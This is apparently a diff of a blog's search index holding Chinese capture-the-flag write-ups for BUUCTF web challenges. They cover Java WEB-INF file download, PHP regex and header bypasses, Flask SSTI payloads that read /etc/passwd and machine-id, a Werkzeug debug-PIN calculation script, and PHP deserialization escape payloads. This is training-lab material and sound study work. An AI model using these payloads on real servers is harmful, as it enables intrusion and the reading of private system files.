@@ -19,6 +19,42 @@
 ]]></content>
   </entry>
   <entry>
+    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
+    <url>/CTF/Web/BUU-Easy_Java/</url>
+    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
+<blockquote>
+<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
+</blockquote>
+<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<p>弱口令，在Bp的Intruder模块下破解密码</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
+<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<blockquote>
+<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
+</blockquote>
+<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
+<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
+<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
+<p>下载打开help.docx中并没有flag</p>
+<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
+<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
+<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
+<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
+]]></content>
+      <categories>
+        <category>Web</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU-ZJCTF,不过如此 - Wp</title>
     <url>/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/</url>
     <content><![CDATA[<p><img src="/CTF/Web/BUU-ZJCTF,%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/00.png" alt="00"></p>
@@ -75,33 +111,43 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-[RoarCTF 2019]Easy Java的Wp</title>
-    <url>/CTF/Web/BUU-Easy_Java/</url>
-    <content><![CDATA[<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>WEB-INF是Java的WEB应用的安全目录,此外想在页面访问WEB-INF应用里面的文件,必须要通过web.xml进行相应的映射才能访问</strong></p>
+    <title>BUU-[MRCTF2020]套娃的Wp</title>
+    <url>/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/</url>
+    <content><![CDATA[<h2 id="BUU-MRCTF2020-套娃的记录"><a href="#BUU-MRCTF2020-套娃的记录" class="headerlink" title="BUU-[MRCTF2020]套娃的记录"></a>BUU-[MRCTF2020]套娃的记录</h2><p><strong>第一关：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 正则绕过 URL中特殊符号的转换</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则<br>&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在.jar文件中<br>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件<br>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</p>
+<p>substr_count($query, ‘_’) 计算在$query字符串中<code>_</code>出现的次数</p>
+<p>preg_match(‘&#x2F;^23333$&#x2F;‘, $_GET[‘b_u_p_t’]) 正则匹配中<code>^</code>是开始的意思, <code>$</code>是结束的意思</p>
 </blockquote>
-<p><strong>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br><span class="line">	//servlet包含了路径信息，我们尝试包含一下FlagController所在路径，不过这次要在前面加上classes来访问class文件目录（详见上面的目录结构），且文件后缀为.class</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="解题"><a href="#解题" class="headerlink" title="解题:"></a>解题:</h3><p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
-<p>弱口令，在Bp的Intruder模块下破解密码</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/01.png"></p>
-<p>进入之后发现并没有flag -&gt; 注意到login页面下面的help可以点,里面有</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/00.png"></p>
+<p>我们传的参数中不能存在<code>_</code> 和<code>%5f</code>&#x3D;&gt; 用空格代替（空格 . [ 都会被转换成_）</p>
+<p>正则匹配的绕过，结尾加上换行符的url编码<code>%0A</code></p>
+<p>payload1：<code>/?b u p t=23333%0A</code></p>
+<p><strong>访问下一个页面</strong>：</p>
+<ul>
+<li><input disabled type="checkbox"> 编码的特征认识</li>
+</ul>
+<p>源码中存在JSfuck编码，<a href="http://www.hiencode.com/jsfuck.html">解码</a>&#x3D;&gt; alert(“post me Merak” </p>
+<p>看Wp说也可以将JSfuck编码在控制台运行一下，也能够弹出</p>
 <blockquote>
-<p><code>java.io.FileNotFoundException</code> 表示在 Java 中尝试打开或读取文件时，未找到指定路径的文件。在你提供的例子中，文件路径是 <code>&#123;help.docx&#125;</code>。</p>
+<p>alert()是js中的弹出函数</p>
 </blockquote>
-<p>此时可以注意到url中是有这个filename参数的，且前面是Download -&gt; 下面对应的文件呗?</p>
-<p>但是并没有跳转下载链接, -&gt; 看别人的Wp说，将get方法改为post方法就能跳转下载链接了（不知道为什么）</p>
-<p><img src="/CTF/Web/BUU-Easy_Java/03.png"></p>
-<p>下载打开help.docx中并没有flag</p>
-<p><strong>结合题目信息 Java 以及上面的知识点</strong>  访问下载WEB-INF&#x2F;web.xml -&gt; </p>
-<p><img src="/CTF/Web/BUU-Easy_Java/04.png"></p>
-<p>再访问下载WEB-INF&#x2F;classes&#x2F;com&#x2F;vm&#x2F;ctf&#x2F;FlagController.class</p>
-<p>打开之后发现一串base64编码的字符串，解码得到flag.</p>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/00.png" alt="./"></p>
+<p><strong>回显出第三个页面：</strong></p>
+<ul>
+<li><input disabled type="checkbox"> 代码审计</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();	<span class="comment">// 这里没有getIp()函数，应该是在HTTP协议里面加一个头XFF头或者其他的（很多种）</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; <span class="comment">// file_get_contents函数, 输出文件内容 flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>主要是根据<code>$re</code>的加密过程来反过来推出来</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $re = &quot;flag.php&quot;;</span><br><span class="line">    $string=&#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($re);$i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $string.=chr(ord($re[$i]) - 2*$i);</span><br><span class="line">    &#125;</span><br><span class="line">    echo base64_encode($string);</span><br></pre></td></tr></table></figure>
+
+<p>payload:<code>/secrettw.php?2333=data:text/plain,todat is a happy day&amp;file=ZmpdYSZmXGI=</code></p>
+<p>抓包 在HTTP头加一个<code>Client-ip: 127.0.0.1</code></p>
+<p><img src="/CTF/Web/BUU-%5BMRCTF2020%5D%E5%A5%97%E5%A8%83/01.png"></p>
 ]]></content>
       <categories>
         <category>Web</category>
@@ -111,61 +157,61 @@
       </tags>
   </entry>
   <entry>
-    <title>BUU-easy_serialize_php的Wp</title>
-    <url>/CTF/Web/BUU-easy_serialize_php/</url>
-    <content><![CDATA[<blockquote>
-<p>1.代码审计</p>
-<p>2.PHP反序列化</p>
-<p>3.反序列化中的对象逃逸</p>
-</blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
+    <title>BUU-[GYCTF2020]FlaskApp的Wp</title>
+    <url>/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/</url>
+    <content><![CDATA[<h2 id="GYCTF2020-FlaskApp的Wp"><a href="#GYCTF2020-FlaskApp的Wp" class="headerlink" title="[GYCTF2020]FlaskApp的Wp"></a>[GYCTF2020]FlaskApp的Wp</h2><p><strong>计算PIN码的方法（必须知道的值）：</strong></p>
 <blockquote>
-<p>$function 变量 通过GET传f变量得到   &#x3D;&gt; 不同的值，对应不同的页面</p>
-<p> -&gt; 当f传入phpinfo , 可以得到提示 &#x3D;&gt; 一个文件的名字 d0g3_f1ag.php</p>
-<p> -&gt;当f传入show_image的时候存在file_get_contents函数 &#x3D;&gt; 可以读取文件内容</p>
+<ol>
+<li>username：就是启动这个flask的用户</li>
+</ol>
+<p>-&gt; <code>etc/passwd</code> 中查看</p>
+<ol start="2">
+<li><p>modname：一般为flask.py</p>
+</li>
+<li><p>getattr(app, “__name__”, app.<strong>class</strong>.<strong>name</strong>)：python该值一般为Flask 值一般不变</p>
+</li>
+<li><p>getattr(mod, ‘file’, None)：为flask目录下的一个app.py的绝对路径（通过报错信息一般回泄露该路径）</p>
+</li>
+<li><p>uuid.getnode()：就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式</p>
+</li>
+</ol>
+<p>-&gt; 通过文件 <code>/sys/class/net/eth0/address</code>获取     # eth0 处为当前使用的网卡</p>
+<ol start="6">
+<li>get_machine_id() ：&#x2F;etc&#x2F;machine-id或者 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i中的值</li>
+</ol>
+<p>-&gt;假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\Microsoft\Cryptography的值</p>
+<p>-&gt;假如是Docker机 那么为 &#x2F;proc&#x2F;self&#x2F;cgroup</p>
 </blockquote>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>python shell的一些命令(os 模块)</p>
+<p>import os</p>
+<p>查看当前目录所有文件 <code>os.listdir(&#39;.&#39;)</code></p>
+<p>查看当前目录<code>os.getcwd()</code></p>
+<p>更改目录<code>os.chdir()</code></p>
+<p>打开文件<code>os.popen(&#39;cat filepath&#39;).read()</code></p>
+<p>打开文件<code>exec(open(&#39;filepath&#39;).read())</code> 好像会报错，但是报错中有文件内容</p>
+<p><strong>解题：</strong></p>
+<p>题目是FlaskAPP，打开网址，有提示.</p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/03.png"></p>
+<p>获取到的信息：Flask 和 PIN（根据要获得PIN的需要知道的数值） -&gt; 读取文件 -&gt;SSTI（Flask）注入读取文件</p>
+<p><strong>SSTI</strong> 要寻找注入点-&gt; 先经过base64加密之后 再进行base64解码 （注入点在base64解码那里）</p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/04.png"></p>
+<p><strong>Payload：</strong></p>
+<p><strong>1.获取username</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/passwd').read()&#125;&#125;</code></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/00.png"></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/01.png"></p>
+<p>2.获取Mac地址（同上, 转成十进制）</p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/sys/class/net/eth0/address').read()&#125;&#125;</code></p>
+<p><img src="/CTF/Web/BUU-%5BGYCTF2020%5DFlaskApp/02.png"></p>
+<p><strong>3.获取机器ID（不止这第一个路径，还有几个其他的，都要试试，我的是这个得到了正确答案）</strong></p>
+<p><code>&#123;&#123;&#123;&#125;.__class__.__mro__[-1].__subclasses__()[102].__init__.__globals__['open']('/etc/machine-id').read()&#125;&#125;</code></p>
+<p><strong>获取PIN的脚本（网上找的）</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;11296411583006&#x27;</span><span class="comment"># str(uuid.getnode()),  /sys/class/net/eth0/address</span></span><br><span class="line">    <span class="string">&#x27;1408f836b0ca514d796cbf8960e45fa1&#x27;</span>, <span class="comment"># get_machine_id(),/etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
 
-<blockquote>
-<p>filter函数 &#x3D;&gt;过滤函数, 将一系列黑名单替换为空 &#x3D;&gt; 将$img变量中存在黑名单的内容替换为空</p>
-</blockquote>
-<p>-&gt; 以及serialize和unserialize两个序列化函数，想到键值对的逃逸</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">// 以POST方法传入参数 =&gt; extract函数的作用是将post方法传入的键值对，以变量的形式返回</span></span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="comment">// 将$_SESSION序列化后进行filter进行过滤，然后赋值给 $serialize_info变量</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>); <span class="comment">// 将$serialize_info变量进行反序列化</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将$userinfo变量数组中img的值进行base64解码后进行文件的读取</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/CTF/Web/BUU-easy_serialize_php/test00.png"></p>
+
 <hr>
-<p><strong>如何去构造一个字符串逃逸</strong></p>
-<hr>
-<p><strong>1.键名逃逸</strong></p>
-<p>如何传入$_SESSION[phpflag] 序列化之后</p>
-<p>-&gt; s:7:”phpflag”:s:48:”” &#x3D;&gt; s:7:”<code>&quot;:s:48:&quot;</code>;”</p>
-<p>-&gt; 48是 传入phpflag的值的长度（即, $img对应的值）</p>
-<p>-&gt; 最后要进行序列化的闭合 <code>;&#125;</code></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="comment">// s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
-
-<p>结合起来</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;phpflag&#x27;</span>]=<span class="string">&quot;;s:1:\&quot;1\&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;phpflag&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>逃逸成了 </p>
-<p>“;s:48: 的变量名对应的值为1 </p>
-<p>​	-&gt; 注意的点<code>&quot;;s:</code>肯定有，48:是后面的值的长度</p>
-<p>​	-&gt; 第二个”是传入的值的前引号</p>
-<p>​	-&gt;我们需要自己构造的是闭合这个名字 <code>;</code></p>
-<p>img的变量名对应的值对 base64_encode(d0g3_f1ag.php)</p>
-<p>​	-&gt; 注意的点，闭合这个序列化 ;}</p>
-</blockquote>
-<p><strong>2.键值逃逸</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;flagflagflagflagflagphp&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="string">&quot;;s:3:\&quot;img\&quot;;s:20:\&quot;ZDBnM19mMWFnLnBocA==\&quot;;&#125;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>( <span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>) );</span><br><span class="line"><span class="comment">// &quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>先将自己要写入的代码放进去 也就是$function的值</p>
-<p>-&gt;通过测试，一步步调整 user中的值 来闭合</p>
-</blockquote>
-<p><code>&quot;a:2:&#123;s:4:&quot;user&quot;;s:23:&quot;flagflagflagflagflagphp&quot;;s:8:&quot;function&quot;;s:40:&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;&#125;&quot;</code></p>
-<p><code>&quot;;s:8:&quot;function&quot;;s:40:&quot;</code> -&gt;这是23的长度，我们传入function中的值，开始要有一个”和; 来闭合前面user的值</p>
